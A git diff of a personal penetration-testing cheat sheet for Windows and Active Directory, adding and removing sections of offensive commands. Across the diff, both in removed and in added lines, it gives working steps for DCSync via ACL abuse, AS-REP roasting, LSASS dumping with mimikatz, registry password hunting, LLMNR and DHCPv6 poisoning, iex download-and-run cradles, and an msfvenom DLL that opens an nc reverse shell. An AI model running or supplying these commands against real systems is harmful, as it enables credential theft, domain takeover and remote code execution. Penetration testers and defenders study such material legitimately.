@@ -355,27 +355,6 @@ root@kali:$ smbclient -U snovvcrash '\\127.0.0.1\Users' 'Passw0rd!'
 
 
 
-### CrackMapExec
-
-Install bleeding-edge:
-
-```
-$ git clone --recursive https://github.com/byt3bl33d3r/CrackMapExec ~/tools/CrackMapExec && cd ~/tools/CrackMapExec
-$ sudo python3 -m pip install pipenv
-$ pipenv install && pipenv shell
-(CrackMapExec) $ python setup.py install
-(CrackMapExec) $ sudo ln -s /home/snovvcrash/.virtualenvs/CrackMapExec/bin/crackmapexec /usr/bin/CME
-(CrackMapExec) $ CME smb 127.0.0.1 -u 'anonymous' -p '' -M spider_plus
-```
-
-```
-$ crackmapexec smb 127.0.0.1 -u nullinux_users.txt -p 'Passw0rd!' --shares [--continue-on-success]
-$ crackmapexec smb 127.0.0.1 -u snovvcrash -p 'Passw0rd!' --spider-folder 'E\$' --pattern s3cret
-$ crackmapexec smb 127.0.0.1 -u j.doe -p 'Passw0rd!' -d 'CORP' --spider Users --pattern '.'
-```
-
-
-
 
 ## NFS
 
@@ -448,6 +427,17 @@ $ cat ldapsearch.log | awk '{print $1}' | sort | uniq -c | sort -nr
 
 
 
+### LDAPPER.py
+
+* [https://github.com/shellster/LDAPPER](https://github.com/shellster/LDAPPER)
+
+```
+$ git clone https://github.com/shellster/LDAPPER
+$ sudo python3 -m pip install -r requirements.txt
+```
+
+
+
 ### windapsearch
 
 * [github.com/ropnop/windapsearch](https://github.com/ropnop/windapsearch)
@@ -488,19 +478,6 @@ $ nmap -p 139,445 --script=/usr/share/nmap/scripts/smb-os-discovery --script-arg
 
 
 
-### Impacket
-
-Install latest:
-
-```
-root@kali:$ git clone [1]
-root@kali:$ python3 -m pip install --upgrade .
-```
-
-1. [github.com/SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket)
-
-
-
 ### Dump Users from DCE/RPC SAMR
 
 
@@ -524,9 +501,11 @@ root@kali:$ enum4linux -v -a 127.0.0.1 | tee enum4linux.txt
 
 #### nullinux.py
 
+* [github.com/m8r0wn/nullinux](https://github.com/m8r0wn/nullinux)
+
 ```
-root@kali:$ git clone https://github.com/m8r0wn/nullinux ~/tools/nullinux && cd ~/tools/nullinux && sudo bash setup.sh && ln -s ~/tools/nullinux/nullinux.py /usr/local/bin/nullinux.py && cd -
-root@kali:$ nullinux.py 127.0.0.1
+$ git clone https://github.com/m8r0wn/nullinux ~/tools/nullinux && cd ~/tools/nullinux && sudo bash setup.sh && ln -s ~/tools/nullinux/nullinux.py /usr/local/bin/nullinux.py && cd -
+$ nullinux.py 127.0.0.1
 ```
 
 
@@ -535,192 +514,6 @@ root@kali:$ nullinux.py 127.0.0.1
 ```
 root@kali:$ samrdump.py 127.0.0.1
 ```
-
-
-
-### AS_REP Roasting
-
-`GetNPUsers.py`:
-
-```
-$ GetNPUsers.py MEGACORP.LOCAL/ -dc-ip 127.0.0.1 -k -no-pass -usersfile /usr/share/seclists/Usernames/Names/names.txt -request -format hashcat -outputfile hash.asprep |tee GetNPUsers.log
-$ cat GetNPUsers.log |grep -v 'Client not found in Kerberos database'
-$ ./hashcat64.exe -m 18200 -a 0 -r rules/best64.rule hashes/hash.asprep seclists/Passwords/*
-```
-
-Show domain users with `DONT_REQ_PREAUTH` flag with `PowerView.ps1`:
-
-```
-PS > . ./PowerView.ps1
-PS > Get-DomainUser -UACFilter DONT_REQ_PREAUTH
-```
-
-1. [PayloadsAllTheThings/Active Directory Attack.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#krb_as_rep-roasting)
-
-
-
-### DCSync
-
-Potential risk -- "Exchange Windows Permissions" group:
-
-```
-PS > net group "Exchange Windows Permissions" snovvcrash /ADD /DOMAIN
-PS > net group "Remote Management Users" snovvcrash /ADD /DOMAIN
-Or
-PS > Add-ADGroupMember -Identity 'Exchange Windows Permissions' -Members snovvcrash
-PS > Add-ADGroupMember -Identity 'Remote Management Users' -Members snovvcrash
-```
-
-
-#### Powerview (v2)
-
-```
-PS > Add-ObjectAcl -TargetDistinguishedName 'DC=megacorp,DC=local' -PrincipalName snovvcrash -Rights DCSync -Verbose
-```
-
-
-#### Powerview (v3)
-
-```
-PS > $pass = 'Passw0rd!' |ConvertTo-SecureString -AsPlainText -Force
-PS > $cred = New-Object System.Management.Automation.PSCredential('MEGACORP\snovvcrash', $pass)
-PS > Add-DomainObjectAcl -TargetIdentity 'DC=megacorp,DC=local' -PrincipalIdentity snovvcrash -Credential $cred -Rights DCSync -Verbose
-```
-
-
-#### ntlmrelayx.py + secretsdump.py
-
-```
-root@kali:$ ntlmrelayx.py -t ldap://127.0.0.1 --escalate-user snovvcrash
-root@kali:$ secretsdump.py MEGACORP.LOCAL/snovvcrash:'Passw0rd!'@127.0.0.1 -just-dc
-```
-
-1. [dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/)
-2. [blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
-
-
-#### aclpwn.py
-
-```
-root@kali:$ aclpwn -f snovvcrash -ft user -t MEGACORP.LOCAL -tt domain -d MEGACORP.LOCAL -du neo4j -dp neo4j --server 127.0.0.1 -u snovvcrash -p 'Passw0rd!' -sp 'Passw0rd!'
-```
-
-1. [www.slideshare.net/DirkjanMollema/aclpwn-active-directory-acl-exploitation-with-bloodhound](https://www.slideshare.net/DirkjanMollema/aclpwn-active-directory-acl-exploitation-with-bloodhound)
-2. [www.puckiestyle.nl/aclpwn-py/](https://www.puckiestyle.nl/aclpwn-py/)
-
-
-#### Manually
-
-1. Получить ACL для корневого объекта (домен).
-2. Получить SID для аккаунта, которому нужно дать DCSync.
-3. Создать новый ACL и выставить в нем права "Replicating Directory Changes" (GUID `1131f6ad-...`) и "Replicating Directory Changes All" (GUID `1131f6aa-...`) для SID из п. 2.
-4. Применить изменения.
-
-```
-PS > Import-Module ActiveDirectory
-PS > $acl = get-acl "ad:DC=megacorp,DC=local"
-PS > $user = Get-ADUser snovvcrash
-PS > $sid = new-object System.Security.Principal.SecurityIdentifier $user.SID
-PS > $objectguid = new-object Guid 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
-PS > $identity = [System.Security.Principal.IdentityReference] $sid
-PS > $adRights = [System.DirectoryServices.ActiveDirectoryRights] "ExtendedRight"
-PS > $type = [System.Security.AccessControl.AccessControlType] "Allow"
-PS > $inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] "None"
-PS > $ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule $identity,$adRights,$type,$objectGuid,$inheritanceType
-PS > $acl.AddAccessRule($ace)
-PS > $objectguid = new-object Guid 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
-PS > $ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule $identity,$adRights,$type,$objectGuid,$inheritanceType
-PS > $acl.AddAccessRule($ace)
-PS > Set-acl -aclobject $acl "ad:DC=megacorp,DC=local"
-```
-
-1. [github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md](https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md)
-
-
-#### Mimikatz
-
-```
-PS > lsadump::dcsync /domain:MEGACORP.LOCAL /user:krbtgt@MEGACORP.LOCAL
-```
-
-1. [adsecurity.org/?p=1729](https://adsecurity.org/?p=1729)
-2. [pentestlab.blog/2018/04/09/golden-ticket/](https://pentestlab.blog/2018/04/09/golden-ticket/)
-
-
-#### MISC
-
-* [www.slideshare.net/harmj0y/the-unintended-risks-of-trusting-active-directory](https://www.slideshare.net/harmj0y/the-unintended-risks-of-trusting-active-directory)
-* [github.com/fox-it/Invoke-ACLPwn](https://github.com/fox-it/Invoke-ACLPwn)
-* [gist.github.com/monoxgas/9d238accd969550136db](https://gist.github.com/monoxgas/9d238accd969550136db)
-
-
-
-### DnsAdmins
-
-```
-root@kali:$ msfvenom -p windows/x64/exec cmd='c:\users\snovvcrash\documents\nc.exe 127.0.0.1 1337 -e powershell' -f dll > inject.dll
-PS > dnscmd.exe <HOSTNAME> /Config /ServerLevelPluginDll c:\users\snovvcrash\desktop\i.dll
-PS > Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll
-PS > (sc.exe \\<HOSTNAME> stop dns) -and (sc.exe \\<HOSTNAME> start dns)
-
-PS > reg delete HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
-PS > (sc.exe \\<HOSTNAME> stop dns) -and (sc.exe \\<HOSTNAME> start dns)
-```
-
-1. [medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83](https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83)
-2. [www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
-3. [ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise)
-4. [adsecurity.org/?p=4064](https://adsecurity.org/?p=4064)
-
-
-
-### Azure Admins
-
-```
-PS > . ./Azure-ADConnect.ps1
-PS > Azure-ADConnect -server 127.0.0.1 -db ADSync
-```
-
-* [github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1)
-* [blog.xpnsec.com/azuread-connect-for-redteam/](https://blog.xpnsec.com/azuread-connect-for-redteam/)
-
-
-
-### Bloodhound
-
-Setup:
-
-```
-* Instal neo4j from [1]
-
-root@kali:$ neo4j console
-...change default password at localhost:7474...
-
-root@kali:$ neo4j start
-root@kali:$ git clone https://github.com/BloodHoundAD/BloodHound
-root@kali:$ wget [2]
-root@kali:$ unzip BloodHound-linux-x64.zip && rm BloodHound-linux-x64.zip && cd BloodHound-linux-x64
-root@kali:$ ./BloodHound --no-sandbox
-```
-
-1. [neo4j.com/docs/operations-manual/current/installation/linux/debian/#debian-installation](https://neo4j.com/docs/operations-manual/current/installation/linux/debian/#debian-installation)
-2. [github.com/BloodHoundAD/BloodHound/releases](https://github.com/BloodHoundAD/BloodHound/releases)
-
-Collect graphs via `Ingestors/SharpHound.ps1`:
-
-```
-PS > . .\SharpHound.ps1
-PS > Invoke-Bloodhound -CollectionMethod All -Domain MEGACORP.LOCAL -LDAPUser snovvcrash -LDAPPass 'Passw0rd!'
-```
-
-Collect graphs via `bloodHound.py` **[1]** (with BloodHound running):
-
-```
-root@kali:$ git clone https://github.com/fox-it/BloodHound.py ~/tools/BloodHound.py && cd ~/tools/BloodHound.py && python setup.py install && cd -
-root@kali:$ bloodhound-python -c All -u snovvcrash -p 'Passw0rd!' -d MEGACORP.LOCAL -ns 127.0.0.1
-```
-
-1. [github.com/fox-it/BloodHound.py](https://github.com/fox-it/BloodHound.py)
 
 
 
@@ -798,7 +591,7 @@ PS > (Get-ADDomain -Server $DomainName).NetBIOSName
 ```
 
 
-#### MISC
+#### Misc
 
 * [activedirectorypro.com/active-directory-user-naming-convention/](https://activedirectorypro.com/active-directory-user-naming-convention/)
 
@@ -845,11 +638,15 @@ PS > robocopy /B W:\Windows\NTDS\ntds.dit C:\Users\snovvcrash\Documents\ntds.dit
 
 ### ProcDump
 
+* [docs.microsoft.com/en-us/sysinternals/downloads/procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)
 * [download.sysinternals.com/files/Procdump.zip](https://download.sysinternals.com/files/Procdump.zip)
 
 ```
 PS > .\procdump64.exe -accepteula -64 -ma lsass.exe lsass.dmp
 $ pypykatz lsa minidump lsass.dmp
+Or
+mimikatz # sekurlsa::minidump lsass.dmp
+mimikatz # sekurlsa::logonPasswords full
 ```
 
 
@@ -1113,6 +910,34 @@ $ vi genetic.config
 $ python ebowla.py rev.exe genetic.config && rm rev.exe
 $ ./build_x64_go.sh output/go_symmetric_rev.exe.go ebowla-rev.exe [--hidden] && rm output/go_symmetric_rev.exe.go
 [+] output/ebowla-rev.exe
+```
+
+
+
+### Invoke-Obfuscation
+
+* [github.com/danielbohannon/Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
+* [www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide](https://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide)
+
+
+### Out-EncryptedScript.ps1
+
+* [github.com/PowerShellMafia/PowerSploit/blob/master/ScriptModification/Out-EncryptedScript.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/ScriptModification/Out-EncryptedScript.ps1)
+* [powersploit.readthedocs.io/en/latest/ScriptModification/Out-EncryptedScript/](https://powersploit.readthedocs.io/en/latest/ScriptModification/Out-EncryptedScript/)
+
+Download:
+
+```
+$ curl -L https://github.com/PowerShellMafia/PowerSploit/blob/master/ScriptModification/Out-EncryptedScript.ps1 > outenc.ps1
+```
+
+Use:
+
+```
+PS > Out-EncryptedScript .\script.ps1 $(ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force) s4lt -FilePath .\evil.ps1
+PS > [string] $cmd = gc .\evil
+PS > $dec = de "Passw0rd!" s4lt
+PS > Invoke-Expression $dec
 ```
 
 
@@ -1993,7 +1818,7 @@ PS > Get-Content C:\Users\snovvcrash\AppData\Roaming\Microsoft\Windows\PowerShel
 
 ##### Tools
 
-`winPEAS.bat` (winPEAS):
+winPEAS:
 
 ```
 root@kali:$ git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite ~/tools/privilege-escalation-awesome-scripts-suite
@@ -2001,16 +1826,18 @@ root@kali:$ cp ~/tools/privilege-escalation-awesome-scripts-suite/winPEAS/winPEA
 PS > (new-object net.webclient).downloadfile('http://127.0.0.1/winPEAS.exe', 'C:\Users\snovvcrash\music\winPEAS.exe')
 ```
 
-`PowerUp.ps1` (PowerSploit):
+PowerUp.ps1:
+
+* [github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
+* [github.com/HarmJ0y/CheatSheets/blob/master/PowerUp.pdf](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerUp.pdf)
+* [recipeforroot.com/advanced-powerup-ps1-usage/](https://recipeforroot.com/advanced-powerup-ps1-usage/)
 
 ```
-root@kali:$ git clone https://github.com/PowerShellMafia/PowerSploit/ -b dev ~/tools/PowerSploit
-root@kali:$ cp ~/tools/PowerSploit/Privesc/PowerUp.ps1 . && python3 -m http.server 80
-PS > powershell.exe -exec bypass -nop -c "iex(new-object net.webclient).downloadstring('http://127.0.0.1/PowerUp.ps1')"
-PS > Invoke-AllChecks |Out-File powerup.txt
+$ curl -L https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1 > powerup.ps1
+PS > Invoke-PrivescAudit
 ```
 
-`Sherlock.ps1`:
+Sherlock.ps1:
 
 ```
 root@kali:$ wget https://github.com/rasta-mouse/Sherlock/raw/master/Sherlock.ps1 && python3 -m http.server 80
@@ -2018,12 +1845,32 @@ powershell.exe -exec bypass -nop -c "iex(new-object net.webclient).downloadstrin
 PS > powershell.exe -exec bypass -c "& {Import-Module .\Sherlock.ps1; Find-AllVulns |Out-File sherlock.txt}"
 ```
 
-`jaws-enum.ps1` (JAWS):
+Watson:
+
+* [https://github.com/rasta-mouse/Watson](https://github.com/rasta-mouse/Watson)
+
+JAWS:
 
 ```
 root@kali:$ wget https://github.com/411Hall/JAWS/raw/master/jaws-enum.ps1 && python3 -m http.server 80
 PS > powershell.exe -exec bypass -nop -c "iex(new-object net.webclient).downloadstring('http://127.0.0.1/jaws-enum.ps1')"
 PS > .\jaws-enum.ps1 -OutputFileName jaws-enum.txt
+```
+
+PrivescCheck:
+
+* [github.com/itm4n/PrivescCheck](https://github.com/itm4n/PrivescCheck)
+
+```
+Cmd > powershell -ep bypass -c ". .\Invoke-PrivescCheck.ps1; Invoke-PrivescCheck -Extended | Tee-Object result.txt"
+```
+
+Windows-Exploit-Suggester:
+
+* [github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
+
+```
+$ python -u windows-exploit-suggester.py -d 1970-01-01-mssb.xls -i systeminfo.txt --ostext 'windows 10 64-bit' --hotfixes hotfixes.txt | tee wes.log
 ```
 
 
@@ -2072,15 +1919,16 @@ root@kali:$ wmiexec.py -hashes :6bb872d8a9aee9fd6ed2265c8b486490 snovvcrash@127.
 * [github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
 
 
-#### Registry
-
-Search for creds:
+#### Registry & Filesystem
 
 ```
-PS > REG QUERY HKLM /f "password" /t REG_SZ /s
-PS > REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" | findstr /i "DefaultUserName DefaultDomainName DefaultPassword AltDefaultUserName AltDefaultDomainName AltDefaultPassword LastUsedUsername"
+PS > cmd /c dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
+PS > cmd /c where /R C:\ *.ini
+PS > reg query HKLM /f "password" /t REG_SZ /s
+PS > reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" | findstr /i "DefaultUserName DefaultDomainName DefaultPassword AltDefaultUserName AltDefaultDomainName AltDefaultPassword LastUsedUsername"
 Or
 PS > Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" | select DefaultPassword
+PS > reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings" | findstr /i proxy
 ```
 
 
@@ -2347,7 +2195,7 @@ root@kali:$ netdiscover -i eth0 -r 192.168.0.1/24 -c 20
 
 
 
-### Hunt for Subnets
+### Hunting for Subnets
 
 * [hub.packtpub.com/optimize-scans/](https://hub.packtpub.com/optimize-scans/)
 
@@ -2381,19 +2229,38 @@ root@kali:$ arpspoof -c both -t VICTIM_10.0.0.5 GATEWAY_10.0.0.1
 
 ##### LLMNR/NBNS Poisoning
 
-```
-root@kali:$ responder -w -F -vvv -I <eth#>
-```
+Responder:
 
 * [www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
+* [github.com/SpiderLabs/Responder](https://github.com/SpiderLabs/Responder)
+* [github.com/lgandx/Responder](https://github.com/lgandx/Responder)
+
+```
+$ git clone https://github.com/lgandx/Responder
+$ ./Responder.py -I eth0 -vwrf
+```
+
+Inveigh:
+
+* [github.com/Kevin-Robertson/Inveigh](https://github.com/Kevin-Robertson/Inveigh)
+
+```
+$ curl -L https://github.com/Kevin-Robertson/Inveigh/raw/master/Inveigh.ps1 > inveigh.ps1
+PS > Invoke-Inveigh [-IP '10.10.13.37'] -ConsoleOutput Y -FileOutput Y –NBNS Y –mDNS Y –Proxy Y -MachineAccounts Y
+```
 
 ##### DHCPv6
 
-```
-root@kali:$ ./mitm6.py -i <eth#>
-```
+mitm6.py:
 
 * [blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)
+* [github.com/fox-it/mitm6](https://github.com/fox-it/mitm6)
+
+```
+$ git clone https://github.com/fox-it/mitm6
+$ python3 setup.py install
+$ mitm6.py -i eth0
+```
 
 
 
@@ -2435,6 +2302,16 @@ Nmap:
 ```
 root@kali:$ nmap -n -Pn -iL subnets/ranges.txt -oA hosts/rmisweep -p22,80,443,3389,2222,5985,5986 [--min-rate 1280 --min-hostgroup 256]
 root@kali:$ grep 'open' hosts/rmisweep.gnmap |cut -d' ' -f2 |sort -u -t'.' -k1,1n -k2,2n -k3,3n -k4,4n >> hosts/targets.txt
+```
+
+`Invoke-Portscan.ps1`:
+
+* [github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Invoke-Portscan.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Invoke-Portscan.ps1)
+* [powersploit.readthedocs.io/en/latest/Recon/Invoke-Portscan/](https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Portscan/)
+
+```
+$ curl -L https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Invoke-Portscan.ps1 > portscan.ps1
+PS > Invoke-Portscan -Hosts 127.0.0.1/24 -T 4 -TopPorts 25 -oA localnet
 ```
 
 
@@ -2536,7 +2413,7 @@ root@kali:$ parsenmap.py -i services/alltcp-versions.xml
 
 
 
-### LHF Exploits
+### LHF Exploits & Checkers
 
 
 #### BlueKeep
@@ -2544,7 +2421,7 @@ root@kali:$ parsenmap.py -i services/alltcp-versions.xml
 CVE-2019-0708.
 
 ```
-msf5 > use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+msf5 > use auxiliary/scanner/rdp/cve_2019_0708_bluekeep_rce
 ```
 
 
@@ -2564,6 +2441,22 @@ CVE-2008-4250, MS08-067.
 ```
 msf5 > use exploit/windows/smb/ms08_067_netapi
 ```
+
+
+#### SIGRed
+
+CVE-2020-1350.
+
+* [github.com/T13nn3s/CVE-2020-1350](https://github.com/T13nn3s/CVE-2020-1350)
+
+
+#### Zerologon
+
+CVE-2020-1472.
+
+* [github.com/SecuraBV/CVE-2020-1472](https://github.com/SecuraBV/CVE-2020-1472)
+* [github.com/dirkjanm/CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472)
+* [github.com/blackarrowsec/redteam-research/tree/master/CVE-2020-1472](https://github.com/blackarrowsec/redteam-research/tree/master/CVE-2020-1472)
 
 
 
@@ -2594,16 +2487,66 @@ root@kali:$ nmap -n -Pn -sV -sC [-sT] [--reason] -oA nmap/output 127.0.0.1 -p$po
 root@kali:$ rm ports
 ```
 
-Top Windows TCP ports:
+Top TCP ports:
 
-```
-53,80,88,135,139,389,443,445,464,593,636,1433,3268,3269,3389,5985,5986,9389
-```
+| Port  |            Service            |
+|-------|-------------------------------|
+|    21 | FTP                           |
+|    22 | SSH                           |
+|    23 | Telnet                        |
+|    25 | SMTP                          |
+|    53 | DNS                           |
+|    80 | HTTP                          |
+|    88 | KDC                           |
+|   111 | SUNRPC                        |
+|   135 | MSRPC                         |
+|   137 | NetBIOS                       |
+|   139 | SMB                           |
+|   389 | LDAP                          |
+|   443 | SSL/TLS                       |
+|   445 | SMB                           |
+|   464 | KPASSWD                       |
+|   593 | HTTP RPC Endpoint Mapper      |
+|   636 | LDAP over SSL/TLS             |
+|   873 | RSYNC                         |
+|  1099 | JavaRMI                       |
+|  1433 | MSSQL                         |
+|  1521 | Oracle                        |
+|  2049 | NFS                           |
+|  3268 | Microsoft Global Catalog      |
+|  3269 | Microsoft Global Catalog      |
+|  3306 | MySQL/MariaDB                 |
+|  3389 | RDP                           |
+|  4786 | Cisco Smart Install           |
+|  5432 | PostgreSQL                    |
+|  5555 | HP Data Protector             |
+|  5900 | VNC                           |
+|  5985 | WinRM                         |
+|  5986 | WinRM over SSL/TLS            |
+|  6379 | Redis                         |
+|  8080 | HTTP                          |
+|  8443 | SSL/TLS                       |
+|  9389 | Active Directory Web Services |
+|  9200 | Elasticsearch                 |
+| 27017 | MongoDB                       |
 
 Top UDP ports:
 
+| Port |  Service   |
+|------|------------|
+|   53 | DNS        |
+|   67 | DHCP       |
+|   68 | DHCP       |
+|   69 | TFTP       |
+|   88 | KDC        |
+|  123 | NTP        |
+|  161 | SNMP       |
+|  162 | SNMPTRAP   |
+|  500 | IKE        |
+| 3391 | RD Gateway |
+
 ```
-53,67,68,69,88,111,123,137,138,139,161,162,389,445,500,3391
+$ sudo masscan --rate=500 --open -p22,80,443,U:161,U:500 -iL routes.txt --resume paused.conf >> alltcp.txt
 ```
 
 
@@ -2737,92 +2680,139 @@ $ cewl -d 5 -m 5 -w passwords.txt --with-numbers --email_file emails.txt http://
 
 
 
+### Tools
 
 
-# Reverse & PWN
+#### Bloodhound
 
-
-
-
-
-## Ghidra
-
-Download through Tor:
-
-* [ghidra-sre.org/](https://ghidra-sre.org/)
-
-Install:
+##### Setup
 
 ```
-$ mv /opt/tor-browser/Browser/Downloads/ghidra*.zip ~/tools
-$ cd ~/tools && unzip ghidra*.zip && rm ghidra*.zip && mv ghidra* ghidra && cd -
-$ sudo apt install openjdk-11-jdk
+$ sudo apt install neo4j
+$ sudo neo4j console
+...change default password at localhost:7474...
+$ sudo neo4j start
+$ wget https://github.com/BloodHoundAD/BloodHound/releases/latest
+$ unzip BloodHound-linux-x64.zip && rm BloodHound-linux-x64.zip && cd BloodHound-linux-x64
+$ sudo ./BloodHound --no-sandbox
 ```
 
+##### SharpHound.ps1
 
-
-
-
-# Technics
-
-
-
-
-## OSINT
-
-
-
-### Domain
+Collect graphs via `Ingestors/SharpHound.ps1`:
 
 ```
-* DNS
-	$ nslookup example.com
-	+ Subdomains & AXFR
-	+ AS details
-	$ whois example.com
-	$ whois 127.0.0.1
-	+ Check for DNS Amplification
-* CMS, Stack, Vulns
-	+ WhatWeb, Wappalyzer
-	+ Shodan/Censys/SecurityTrails
-* Google Dorks
-	+ /robots.txt
-	+ /sitemap.xml
+PS > Invoke-Bloodhound -CollectionMethod All,GPOLocalGroup,LoggedOn -Domain MEGACORP.LOCAL -LDAPUser snovvcrash -LDAPPass 'Passw0rd!'
+```
+
+##### BloodHound.py
+
+* [github.com/fox-it/BloodHound.py](https://github.com/fox-it/BloodHound.py)
+
+Collect graphs via `BloodHound.py` (with BloodHound running):
+
+```
+$ git clone https://github.com/fox-it/BloodHound.py ~/tools/BloodHound.py && cd ~/tools/BloodHound.py && python setup.py install && cd -
+$ bloodhound-python -c All -u snovvcrash -p 'Passw0rd!' -d MEGACORP.LOCAL -ns 127.0.0.1
 ```
 
 
+#### Impacket
 
-
-## Web Application
+* [github.com/SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket)
 
 ```
-* Check src
-$ whatweb http://127.0.0.1
-$ gobuster dir -u 'http://127.0.0.1' -w /usr/share/wordlists/dirbuster/directory-list[-lowercase]-2.3-medium.txt -x php,asp,aspx,jsp,ini,config,cfg,xml,htm,html,json,bak,txt -t 50 -a 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' -s 200,204,301,302,307,401 -o gobuster/127.0.0.1
-$ nikto -h http://127.0.0.1 -Cgidirs all
+$ git clone https://github.com/SecureAuthCorp/impacket
+$ sudo python -m pip install --upgrade .
 ```
 
 
+#### CrackMapExec
 
-
-## Internal
-
-
-
-### Windows
+Install bleeding-edge:
 
 ```
-root@kali:$ enum4linux -v -a 127.0.0.1 | tee enum4linux.txt
-root@kali:$ nullinux.py 127.0.0.1
-root@kali:$ crackmapexec smb 127.0.0.1
-root@kali:$ crackmapexec smb 127.0.0.1 -u 'anonymous' -p '' --shares
-root@kali:$ smbclient -N -L 127.0.0.1
-root@kali:$ rpcclient -U '' -N 127.0.0.1
+$ git clone --recursive https://github.com/byt3bl33d3r/CrackMapExec ~/tools/CrackMapExec && cd ~/tools/CrackMapExec
+$ sudo python3 -m pip install pipenv
+$ pipenv install && pipenv shell
+(CrackMapExec) $ python setup.py install
+(CrackMapExec) $ sudo ln -s /home/snovvcrash/.virtualenvs/CrackMapExec/bin/crackmapexec /usr/bin/CME
+(CrackMapExec) $ CME smb 127.0.0.1 -u 'anonymous' -p '' -M spider_plus
+```
+
+Use:
+
+```
+$ crackmapexec smb 127.0.0.1
+$ crackmapexec smb 127.0.0.1 -u anonymous -p '' --shares
+$ crackmapexec smb 127.0.0.1 -u snovvcrash -p /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt
+$ crackmapexec smb 127.0.0.1 -u nullinux_users.txt -p 'Passw0rd!' --shares [--continue-on-success]
+$ crackmapexec smb 127.0.0.1 -u snovvcrash -p 'Passw0rd!' --spider-folder 'E\$' --pattern s3cret
+$ crackmapexec smb 127.0.0.1 -u j.doe -p 'Passw0rd!' -d 'CORP' --spider Users --pattern '.'
+```
+
+
+#### Empire
+
+* [github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)
+* [github.com/BC-SECURITY/Empire](https://github.com/BC-SECURITY/Empire)
+
+```
+$ git clone https://github.com/BC-SECURITY/Empire
+$ sudo ./setup/install.sh
+```
+
+
+#### PowerView
+
+* [www.harmj0y.net/blog/powershell/make-powerview-great-again/](https://www.harmj0y.net/blog/powershell/make-powerview-great-again/)
+* [github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf)
+* [gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
+* [PowerView 2.0](https://github.com/PowerShellEmpire/PowerTools/raw/master/PowerView/powerview.ps1)
+* [PowerView 3.0 [dev]](https://github.com/PowerShellMafia/PowerSploit/raw/dev/Recon/PowerView.ps1)
+
+```
+$ curl -L https://github.com/PowerShellEmpire/PowerTools/raw/master/PowerView/powerview.ps1 > powerview2.ps1
+$ curl -L https://github.com/PowerShellMafia/PowerSploit/raw/dev/Recon/PowerView.ps1 > powerview3.ps1
+PowerView3 > Get-DomainComputer -Properties Name | Resolve-IPAddress
